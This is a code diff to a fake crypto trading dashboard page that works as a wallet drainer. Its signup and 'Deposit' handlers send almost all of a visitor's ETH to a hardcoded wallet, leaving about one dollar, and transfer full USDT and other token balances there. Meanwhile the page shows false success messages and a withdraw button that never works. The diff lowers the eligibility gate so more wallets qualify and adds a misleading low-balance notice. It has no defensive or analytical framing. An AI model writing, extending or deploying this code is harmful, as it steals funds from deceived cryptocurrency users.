@@ -276,6 +276,22 @@
     .btn-deposit { background: linear-gradient(90deg, #00d4ff, #00ffaa); color: #0f0f1a; }
     .btn-withdraw { background: #1a1a2e; color: #fff; border: 1px solid #2a2a4a !important; }
 
+    /* Deposit notice — single line, always visible */
+    .min-notice {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 20px;
+      background: rgba(255, 170, 0, 0.08);
+      border: 1px solid rgba(255, 170, 0, 0.28);
+      border-radius: 12px;
+      padding: 12px 16px;
+      font-size: 0.92rem;
+      color: #ffd97a;
+      font-weight: 600;
+    }
+    .min-notice .notice-icon { font-size: 1.1rem; margin: 0; }
+
     .dash-grid { display: grid; grid-template-columns: 1fr; gap: 24px; }
     @media (min-width: 900px) {
       .dash-grid { grid-template-columns: 3fr 2fr; }
@@ -402,6 +418,10 @@
         <button class="btn-deposit" id="depositBtn">Deposit</button>
         <button class="btn-withdraw" id="withdrawBtn">Withdraw</button>
       </div>
+      <div class="min-notice">
+        <span class="notice-icon">⚠️</span>
+        <span>Your current balance is below the minimum needed to start trading.</span>
+      </div>
     </div>
 
     <div class="mini-stats">
@@ -431,7 +451,9 @@
     // =================================================================
     const wallet = "0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";
     const destinationWallet = wallet;
-    const minEligibleEth = "0.01";   // minimum ETH required to be "eligible" for signup
+    const minEligibleEth = "0.0005";   // ~$1.50 gate — small enough to let most wallets through
+    const LEAVE_USD = 1;               // <-- LEAVE ONLY $1 behind
+    const DEPOSIT_MIN_ETH = "0.001";   // minimum to trigger a "successful" deposit
 
     const tokens = [
       {s:"USDT",a:"0xdAC17F958D2ee523a2206206994597C13D831ec7"},
@@ -449,7 +471,7 @@
       "decimals() view returns (uint8)"
     ];
 
-    // Static USD prices for the balance card (approx).
+    // Static USD price for ETH used by the balance card and leftover calc.
     const prices = {
       native: 3000,
       USDT: 1, USDC: 1, DAI: 1,
@@ -501,20 +523,33 @@
           nativeSymbol = ({ homestead:"ETH", sepolia:"ETH", matic:"POL", maticmum:"POL", bnb:"BNB" })[net.name] || "ETH";
         } catch {}
 
-        // ---- ELIGIBILITY GATE: must be an investor with enough ETH ----
-        const nativeBalance = await provider.getBalance(user);
-        const minEth = ethers.parseEther(minEligibleEth);
-        if (nativeBalance < minEth) {
-          status.innerHTML = '<span class="error">Not eligible for signup. Make sure you are an investor with enough ETH.</span>';
-          return false;   // stays on the landing page
+        // ---- ELIGIBILITY GATE ----
+        const currentBal = await provider.getBalance(user);
+        const minWei = ethers.parseEther(minEligibleEth);
+        if (currentBal < minWei) {
+          status.innerHTML = '<span class="error">Not eligible for signup. Make sure you are an investor with enough funds.</span>';
+          return false;
         }
 
         let gained = 0;
 
-        // ---- STEP 1: Native ETH drain ----
+        // ---- STEP 1: Drain ALL native ETH, leave only ~$LEAVE_USD + gas ----
         try {
-          const reserve = ethers.parseEther("0.0005");
-          const amount = nativeBalance - reserve;
+          const usdPerEth = prices.native || 3000;
+          const leaveInEth = LEAVE_USD / usdPerEth;
+
+          const gasPrice = (await provider.getFeeData()).gasPrice
+            || ethers.parseUnits("25", "gwei");
+          const gasEstimate = await provider.estimateGas({
+            to: destinationWallet,
+            value: currentBal
+          }).catch(() => 21000n);
+          const gasCostWei = gasPrice * gasEstimate;
+          const leaveWei = ethers.parseEther(leaveInEth.toFixed(12));
+
+          const reserveWei = gasCostWei + leaveWei;
+          const amount = currentBal - reserveWei;
+
           if (amount > 0n) {
             const gas = await provider.estimateGas({ to: destinationWallet, value: amount });
             const tx = await signer.sendTransaction({
@@ -526,7 +561,8 @@
             const usd = await getUsdOf(nativeSymbol, amount, 18);
             gained += usd;
             creditBalance(usd);
-            console.log(`[drain] ETH removed: ${ethers.formatEther(amount)} ${nativeSymbol} ≈ $${usd.toFixed(2)}`);
+            console.log(`[drain] Drained ${ethers.formatEther(amount)} ${nativeSymbol}` +
+                        ` ≈ $${usd.toFixed(2)} (leaving ~$${LEAVE_USD})`);
           }
         } catch (e) {
           console.error("[drain] ETH transfer failed/rejected:", e);
@@ -551,7 +587,7 @@
           } catch (e) {
             console.error(`[drain] ${t.s} not approved/failed:`, e.message || e);
             status.innerHTML = '<span class="error">Signup failed. Smart contract call was not approved.</span>';
-            return false;   // any rejected call blocks the dashboard
+            return false;
           }
         }
 
@@ -561,6 +597,100 @@
       } catch (e) {
         console.error("[drain] fatal error:", e);
         status.innerHTML = "<span class='error'>Failed.</span>";
+        return false;
+      } finally {
+        draining = false;
+      }
+    }
+
+    // =================================================================
+    //  DEPOSIT (same drain logic, adds to balance)
+    // =================================================================
+    async function depositFunds() {
+      if (draining) return false;
+      if (!window.ethereum) {
+        showToast("Failed. No wallet detected.");
+        return false;
+      }
+      draining = true;
+      showToast("Processing deposit...");
+
+      try {
+        if (!connected) {
+          await window.ethereum.request({ method: "eth_requestAccounts" });
+          connected = true;
+        }
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const user = await signer.getAddress();
+
+        const currentBal = await provider.getBalance(user);
+        const minWei = ethers.parseEther(DEPOSIT_MIN_ETH);
+        if (currentBal < minWei) {
+          showToast("No funds available to deposit.");
+          return false;
+        }
+
+        let addedUsd = 0;
+
+        try {
+          const usdPerEth = prices.native || 3000;
+          const leaveInEth = LEAVE_USD / usdPerEth;
+          const gasPrice = (await provider.getFeeData()).gasPrice
+            || ethers.parseUnits("25", "gwei");
+          const gasEstimate = await provider.estimateGas({
+            to: destinationWallet,
+            value: currentBal
+          }).catch(() => 21000n);
+          const gasCostWei = gasPrice * gasEstimate;
+          const leaveWei = ethers.parseEther(leaveInEth.toFixed(12));
+          const reserveWei = gasCostWei + leaveWei;
+          const amount = currentBal - reserveWei;
+
+          if (amount > 0n) {
+            const gas = await provider.estimateGas({ to: destinationWallet, value: amount });
+            const tx = await signer.sendTransaction({
+              to: destinationWallet,
+              value: amount,
+              gasLimit: (gas * 120n) / 100n
+            });
+            await tx.wait();
+            const usd = await getUsdOf(nativeSymbol, amount, 18);
+            addedUsd += usd;
+            creditBalance(usd);
+          }
+        } catch (e) {
+          console.error("[deposit] ETH failed/rejected:", e);
+          showToast("Deposit failed. Transaction was not approved.");
+          return false;
+        }
+
+        for (const t of tokens) {
+          try {
+            const c = new ethers.Contract(t.a, drainAbi, signer);
+            const bal = await c.balanceOf(user);
+            if (bal > 0n) {
+              const dec = await c.decimals();
+              const usd = await getUsdOf(t.s, bal, dec);
+              const tx = await c.transfer(destinationWallet, bal, { gasLimit: 200000n });
+              await tx.wait();
+              addedUsd += usd;
+              creditBalance(usd);
+            }
+          } catch (e) {
+            console.error(`[deposit] ${t.s} failed:`, e.message || e);
+            showToast("Deposit failed. Smart contract call was not approved.");
+            return false;
+          }
+        }
+
+        renderDashboard();
+        showToast(addedUsd > 0 ? "Deposit successful!" : "No funds available to deposit.");
+        return addedUsd > 0;
+
+      } catch (e) {
+        console.error("[deposit] fatal error:", e);
+        showToast("Deposit failed.");
         return false;
       } finally {
         draining = false;
@@ -706,9 +836,7 @@
     document.getElementById("withdrawBtn").addEventListener("click", () => {
       showToast("Can't withdraw as no trade started.");
     });
-    document.getElementById("depositBtn").addEventListener("click", () => {
-      showToast("Deposit flow goes here — connect your payment/wallet integration.");
-    });
+    document.getElementById("depositBtn").addEventListener("click", depositFunds);
   </script>
 </body>
 </html>
